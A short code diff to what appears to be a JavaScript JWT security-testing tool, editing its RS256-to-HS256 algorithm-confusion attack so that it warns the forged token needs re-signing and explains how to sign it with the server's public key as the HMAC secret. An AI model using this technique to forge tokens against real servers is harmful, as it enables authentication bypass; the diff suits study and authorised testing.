@@ -239,10 +239,13 @@ async function runAttacks() {
   if (isRS) {
     appendSection(output, '🔓 Attack 4: RS256 → HS256 Confusion');
     appendLine(output, 'Server uses RSA (RS256). Change to HS256 with the public key as HMAC secret.');
+    appendLine(output, '⚠️ This token reuses the original RS256 signature as-is — it will NOT validate as HS256.');
+    appendLine(output, '   To make this work, you need the server\'s public key and must re-sign:');
+    appendLine(output, '   HMAC-SHA256(base64(header) + "." + base64(payload), publicKey)');
     const confHeader = { ...parsed.header, alg: 'HS256' };
     const confToken = `${base64UrlEncode(JSON.stringify(confHeader))}.${parsed.raw[1]}.${parsed.raw[2]}`;
-    appendToken(output, 'HS256 confusion token', confToken);
-    appendLine(output, '⚠️ This only works if the server leaks its public key and does not validate key type.');
+    appendToken(output, 'HS256 confusion token (needs re-signing)', confToken);
+    appendLine(output, '⚠️ Only works if the server leaks its public key and does not validate key type.');
   } else if (isHS) {
     appendSection(output, '🔓 Attack 4: Algorithm Confusion');
     appendLine(output, 'Token uses symmetric algo (HS256). Confusion attack not applicable (would require RSA).');
